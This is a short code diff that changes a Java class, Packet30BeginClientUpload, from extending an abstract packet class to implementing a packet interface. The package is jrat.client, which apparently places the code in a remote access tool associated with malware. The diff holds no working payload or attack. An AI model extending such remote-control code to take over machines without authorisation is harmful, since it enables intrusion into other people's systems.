@@ -4,7 +4,7 @@ import jrat.client.Connection;
 
 import java.io.File;
 
-public class Packet30BeginClientUpload extends AbstractOutgoingPacket {
+public class Packet30BeginClientUpload implements OutgoingPacket {
 	
 	private File file;
 	
